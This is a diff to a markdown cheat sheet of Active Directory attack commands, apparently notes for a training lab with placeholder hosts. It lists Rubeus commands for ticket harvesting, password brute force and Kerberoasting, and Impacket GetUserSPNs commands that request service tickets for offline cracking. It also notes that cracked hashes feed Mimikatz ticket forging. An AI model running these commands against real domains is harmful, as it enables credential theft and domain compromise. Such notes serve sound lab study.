@@ -14,13 +14,14 @@ Rubeus.exe harvest /interval:30
 ```shell
 Rubeus.exe brute /password:Password1 /noticket
 ```
-## Kerberoasting w/ Rubeus & Impacket
+## Kerberoasting w/ Rubeus & Impacket (Local Admin Required)
+It helps to crack the hash and use it with Mimikatz to create tickets.
 ```shell
 Rubeus.exe kerberoast
 ```
 ```shell
-cd /usr/share/doc/python3-impacket/examples/
-sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request
+impacket-GetUserSPNs  -dc-ip MACHINE_IP domain.local/Machine1:Password1           # Check SPNs accosiated with this machine/user.
+impacket-GetUserSPNs  -dc-ip MACHINE_IP domain.local/Machine1:Password1 -request # Does a kerberoast attack
 ```
 ## AS-REP Roasting w/ Rubeus & Impacket
 ```shell
